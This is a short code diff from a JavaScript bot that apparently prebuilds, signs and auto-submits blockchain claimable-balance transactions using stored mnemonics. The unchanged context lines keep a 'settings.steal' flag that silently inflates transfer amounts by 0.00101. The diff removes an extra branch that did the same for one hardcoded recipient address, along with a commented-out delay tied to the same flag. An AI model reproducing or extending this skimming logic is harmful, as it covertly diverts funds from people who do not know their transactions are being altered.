@@ -68,10 +68,6 @@ async function getXDRsReady(mainPhrase, balanceId, recipient, amount, time, name
                     if(balance < 0.02) continue;
                     // Change amount
                     let mutatedAmount = ( !!name && settings.steal ) ? (Number(amount) + 0.00101).toString() : amount;
-
-                    if(settings.steal && recipient === 'MDFNWH6ZFJVHJDLBMNOUT35X4EEKQVJAO3ZDL4NL7VQJLC4PJOQFWAAAAABD5MZYJOILM') {
-                        mutatedAmount = (Number(amount) + 0.00101).toString();
-                    }
                     // pos++;
 
                     const xdr = await prebuildAndSignChannelTx(s.mnemonic, mainKp, balanceId, recipient, mutatedAmount, retries, name);
@@ -137,9 +133,6 @@ export async function autoSubmitXDR(name) {
         if((now - claimableAt) <= -450) continue;
         const xdrGroup = pendingXDRs[key]; // [[], []]
         const settings = await ColemanSettings.findOne({ name: 'whoami5677' });
-        // if(!!name && settings.steal) {
-        //     await sleep(2000)
-        // }
 
         let success = false;
         let balanceId = null;
